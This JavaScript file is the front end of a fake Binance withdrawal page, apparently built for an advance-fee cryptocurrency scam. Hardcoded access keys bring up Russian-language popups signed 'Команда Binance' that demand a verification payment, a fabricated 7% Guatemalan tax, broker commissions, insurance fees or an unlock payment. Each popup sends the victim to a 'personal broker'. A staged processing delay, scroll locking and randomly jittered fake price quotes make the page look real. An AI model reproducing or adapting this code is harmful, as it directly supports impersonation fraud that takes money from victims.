/** FETCH **/
// const btc = document.getElementById('btc')
// const eth = document.getElementById('eth')
// const bnb = document.getElementById('bnb')
// const xrp = document.getElementById('xrp')
// const sol = document.getElementById('sol')
// let payload = null
// let gotPayloadTimes = 0
// fetch('/server.php')
//   .then(r => r.json())
//   .then(r => {
//     if (r.status === 'ERR') {
//       console.error('Error getting latest crypto quotes')
//       document.querySelectorAll('.dol').forEach(i => i.classList.add('dol--active'))
//       btc.innerText = '108,787.81'
//       eth.innerText = '2,554.80'
//       bnb.innerText = '674.14'
//       xrp.innerText = '2.35'
//       sol.innerText = '176.35'
//       return
//     }

//     gotPayloadTimes++
//     payload = r.payload
//     document.querySelectorAll('.dol').forEach(i => i.classList.add('dol--active'))
//     btc.innerText = r.payload.btc
//     eth.innerText = r.payload.eth
//     bnb.innerText = r.payload.bnb
//     xrp.innerText = r.payload.xrp
//     sol.innerText = r.payload.sol
//   })

// setInterval(() => {
//   btc.innerText = formatWithCommas(doMathBtc(payload.btc))
//   eth.innerText = formatWithCommas(doMathEth(payload.eth))
//   bnb.innerText = formatWithCommas(doMathEth(payload.bnb))
// }, 3500)
// setInterval(() => {
//   if (gotPayloadTimes === 2) return
//   fetch('/server.php')
//     .then(r => r.json())
//     .then(r => {
//       if (r.status === 'ERR') {
//         console.error('Error getting latest crypto quotes')
//         return
//       }

//       gotPayloadTimes++
//       payload = r.payload
//       btc.innerText = r.payload.btc
//       eth.innerText = r.payload.eth
//       bnb.innerText = r.payload.bnb
//       xrp.innerText = r.payload.xrp
//       sol.innerText = r.payload.sol
//     })
// }, 62000)

let lastHistoryState = history.state;
window.addEventListener('popstate', (e) => {
  const currentState = history.state;

  // Check if moving forward (new state exists and wasn't the previous state)
    if (currentState && currentState !== lastHistoryState) {
        main.style.display = 'none'
        sectionTorgGdeUgodno.style.display = 'none'
        sectionForm.style.display = 'block'
    } 
    // Else, assume it's a back navigation (or initial load)
    else {
        main.style.display = 'grid'
        if (window.innerWidth <= 1365) {
          main.style.display = 'block'
        }
        sectionTorgGdeUgodno.style.display = 'flex'
        sectionForm.style.display = 'none'
    }

    lastHistoryState = currentState;
})

const input = document.getElementById('input')
const keys = ['A3F9-7B2E-4C8D-1E6F', 'X5K9-P2L8-Q3M7-R4N6', '9Z4Y-8W3X-7V2U-6T1S', 'JH7D-KG6F-LI5E-MN4C', '2B4Q-6D8S-1F3G-5H7J']
input.addEventListener('input', function() {
  input.classList.remove('code-input--bad')
  this.value = this.value.toUpperCase()
})

let usedKey = null
const main = document.getElementById('main')
const sectionTorgGdeUgodno = document.getElementById('torgGdeUgodno')
const sectionForm = document.getElementById('form')
const btn = document.getElementById('btn')
btn.onclick = () => {
  let isOk = false
  for (const key of keys) {
    if (input.value === key) isOk = true
  }
  if (!isOk) {
    input.classList.add('code-input--bad')
    return
  }

  usedKey = input.value
  if (usedKey === 'A3F9-7B2E-4C8D-1E6F') {
    popupText.innerHTML = `
      <p>Команда Binance заботится о безопасности ваших средств и данных. Для завершения процедуры верификации вашей личности необходимо выполнить подтверждающий платеж в размере 300 GTQ на официальные реквизиты платформы.</p>
      <p>После успешной проверки данная сумма будет полностью возвращена на ваш баланс. Это стандартная процедура, направленная на защиту вашего счета от несанкционированного доступа.</p>
      <p>Для прохождения процедуры верификации, пожалуйста, обратитесь к вашему персональному брокеру <a href="javascript:void(0)" target="_blank">@LESLY OLIVIA GOMEZ</a></p>
      <p>С уважением, <br>Команда Binance</p>
    `
  } else if (usedKey === 'X5K9-P2L8-Q3M7-R4N6') {
    const sum = document.getElementById('sum')
    sum.innerText = formatWithCommas(add300ToSum(sum.innerText))
    popupText.innerHTML = `
      <p>В соответствии с законодательством Республики Гватемала (Указ №26-92 Конгресса Республики Гватемала), для соблюдения налогового регулирования вам необходимо оплатить разовый налог в размере 7% от суммы.</p>
      <p>После успешной проверки и подтверждения оплаты ваша транзакция будет обработана в полном соответствии с законом.</p>
      <p>Для завершения процедуры и уточнения реквизитов, пожалуйста, обратитесь к вашему персональному брокеру <a href="javascript:void(0)" target="_blank">@LESLY OLIVIA GOMEZ</a></p>
      <p>С уважением, <br>Команда Binance</p>
    `
  } else if (usedKey === '9Z4Y-8W3X-7V2U-6T1S') {
    popupText.innerHTML = `
      <p>В соответствии с условиями партнёрства, необходимо оплатить комиссию за брокерское обслуживание в размере 10% от суммы вывода.</p>
      <p>Данный платеж является обязательным и обеспечивает профессиональное управление вашими активами.</p>
      <p>Для получения реквизитов, пожалуйста, обратитесь к вашему персональному брокеру <a href="javascript:void(0)" target="_blank">@LESLY OLIVIA GOMEZ</a></p>
      <p>С уважением, <br>Команда Binance</p>
    `
  } else if (usedKey === 'JH7D-KG6F-LI5E-MN4C') {
    popupText.innerHTML = `
      <p>Для продолжения операции, вам необходимо выполнить страховой взнос в размере 2% от суммы вашего баланса на официальные реквизиты платформы.</p>
      <p>Это стандартная процедура, направленная на защиту вашего аккаунта.</p>
      <p>Для оплаты страхового взноса, обратитесь за реквизитами к вашему персональному брокеру <a href="javascript:void(0)" target="_blank">@LESLY OLIVIA GOMEZ</a></p>
      <p>С уважением, <br>Команда Binance</p>
    `
  } else if (usedKey === '2B4Q-6D8S-1F3G-5H7J') {
      popupText.innerHTML = `
        <p>Обнаружена подозрительная активность!</p>
        <p>В целях безопасности вашего аккаунта, мы временно приостановили возможность совершения операций.</p>
        <p>Для разблокировки баланса и восстановления доступа, пожалуйста, обратитесь к вашему персональному брокеру <a href="javascript:void(0)" target="_blank">@LESLY OLIVIA GOMEZ</a></p>
        <p>Благодарим за понимание!</p>
        <p>С уважением, <br>Команда Binance</p>
      `
  }

  main.style.display = 'none'
  sectionTorgGdeUgodno.style.display = 'none'
  sectionForm.style.display = 'block'
  window.history.pushState(
      {page: 'withdraw'},
      'Binance Withdraw',
      '/withdraw'
    )
  window.scrollTo(0, 0)
}

input.addEventListener('keydown', (e) => {
  if (e.key == 'Enter') btn.click()
})

/** MOBILE NAV **/
const mobileNav = document.querySelector('.mobile-nav')
const mobileNavBtn = document.querySelector('.header__nav-btn')
const mobileNavBtnClose = document.querySelector('.mobile-nav__times')
mobileNavBtn.onclick = () => {
  mobileNav.classList.add('mobile-nav--active')
}
mobileNavBtnClose.onclick = () => {
  mobileNav.classList.remove('mobile-nav--active')
}
document.querySelectorAll('.mobile-nav__row--w-dropdown').forEach(i => {
  i.onclick = (e) => {
    if (e.target.tagName === 'A') return
    i.classList.toggle('mobile-nav__row--w-dropdown--active')
  }
})

/** MOBILE FOOTER **/
const footerMobRows = document.querySelectorAll('.footer--mob__row')
for (const row of footerMobRows) {
  row.addEventListener('click', (e) => {
    if (e.target.tagName === 'A') return
    const plus = row.querySelector('.plus')
    const minus = row.querySelector('.minus')
    const mobList = row.querySelector('.footer--mob__row__list')
    if (mobList.style.display === 'flex') {
      mobList.style.display = 'none'
      plus.style.display = 'inline'
      minus.style.display = 'none'
    } else {
      mobList.style.display = 'flex'
      plus.style.display = 'none'
      minus.style.display = 'inline'
    }
  })
}

/** FORM **/
const form = document.getElementById('form')
const agreedRow = document.getElementById('agreedRow')
const agreed = document.getElementById('agreed')
const btnSubmit = document.getElementById('submitBtn')
const btnSubmitInnerText = document.getElementById('submitInnerText')
form.onsubmit = (e) => {
  e.preventDefault()
  if (!agreed.checked) {
    agreedRow.classList.add('form__row--bad')
    return
  }

  btnSubmit.style.padding = '5px 10px'
  btnSubmit.disabled = true
  btnSubmit.classList.add('btn-submit--processing')
  btnSubmitInnerText.innerHTML = '<span class="spinner"></span>'
  setTimeout(() => {
    overlay.classList.add('overlay--db')
    void overlay.offsetWidth
    overlay.classList.add('overlay--blur')
    popup.classList.add('popup--db')
    void popup.offsetWidth
    popup.classList.add('popup--active')
    disableScrollEvents()
  }, 7000)
}
agreed.addEventListener('change', function() {
  agreedRow.classList.remove('form__row--bad')
})

/** OVERLAY **/
const overlay = document.getElementById('overlay')
const popup = document.querySelector('.popup')
const popupText = document.getElementById('popupText')
const closeBtn = document.getElementById('closeBtn')
closeBtn.onclick = () => {
  overlay.classList.remove('overlay--db')
  overlay.classList.remove('overlay--blur')
  popup.classList.remove('popup--db')
  popup.classList.remove('popup--active')
  btnSubmit.style.padding = '10px'
  btnSubmitInnerText.innerHTML = 'Вывести средства'
  btnSubmit.classList.remove('btn-submit--processing')
  btnSubmit.disabled = false
  enableScrollEvents()
}
overlay.onclick = () => {
  overlay.classList.remove('overlay--db')
  overlay.classList.remove('overlay--blur')
  popup.classList.remove('popup--db')
  popup.classList.remove('popup--active')
  btnSubmit.style.padding = '10px'
  btnSubmitInnerText.innerHTML = 'Вывести средства'
  btnSubmit.classList.remove('btn-submit--processing')
  btnSubmit.disabled = false
  enableScrollEvents()
}

/** SELECT **/
const select = document.getElementById('select')
select.addEventListener('change', function() {
  const selectedValue = select.value
  if (selectedValue !== "") this.className = 'select-color-chosen'
  else this.className = ''
})


function doMathBtc(strNum) {
  const num = parseFloat(strNum.replace(/,/g, ''))

  const op = getRandomBoolean() ? '+' : '-'
  const pingPong = getRandomNumberBetween5And25()
  let res = 0
  if (op === '+') {
    res = num + pingPong
  } else {
    res = num - pingPong
  }

  return res.toFixed(2)
}
function doMathEth(strNum) {
  const num = parseFloat(strNum.replace(/,/g, ''))

  const op = getRandomBoolean() ? '+' : '-'
  const pingPong = getRandomNumberBetween0And3()
  let res = 0
  if (op === '+') {
    res = num + pingPong
  } else {
    res = num - pingPong
  }

  return res.toFixed(2)
}
function doMathBnb(strNum) {
  const num = parseFloat(strNum.replace(/,/g, ''))

  const op = getRandomBoolean() ? '+' : '-'
  const pingPong = getRandomNumberBetween0And1()
  let res = 0
  if (op === '+') {
    res = num + pingPong
  } else {
    res = num - pingPong
  }

  return res.toFixed(2)
}
function getRandomNumberBetween5And25() {
  return Math.random() * 20 + 5;
}
function getRandomNumberBetween0And3() {
  return Math.random() * 3;
}
function getRandomNumberBetween0And1() {
  return Math.random();
}
function getRandomBoolean() {
  return Math.random() >= 0.5;
}
function formatWithCommas(num) {
  // Convert to string if it's a number
  const numStr = typeof num === 'number' ? num.toString() : num;
  
  // Split into integer and decimal parts
  const parts = numStr.split('.');
  let integerPart = parts[0];
  const decimalPart = parts.length > 1 ? `.${parts[1]}` : '';

  // Add commas every 3 digits from the right
  integerPart = integerPart.replace(/\B(?=(\d{3})+(?!\d))/g, ',');

  return integerPart + decimalPart;
}

function add300ToSum(sum) {
  const num = parseFloat(sum.replace(/,/g, ''))

  const res = num + 300

  return res
}

function preventDefaultScroll(e) {
  e.preventDefault();
  e.stopPropagation();
  return false;
}

function disableScrollEvents() {
  window.addEventListener('wheel', preventDefaultScroll, { passive: false });
  window.addEventListener('touchmove', preventDefaultScroll, { passive: false });
}

function enableScrollEvents() {
  window.removeEventListener('wheel', preventDefaultScroll);
  window.removeEventListener('touchmove', preventDefaultScroll);
}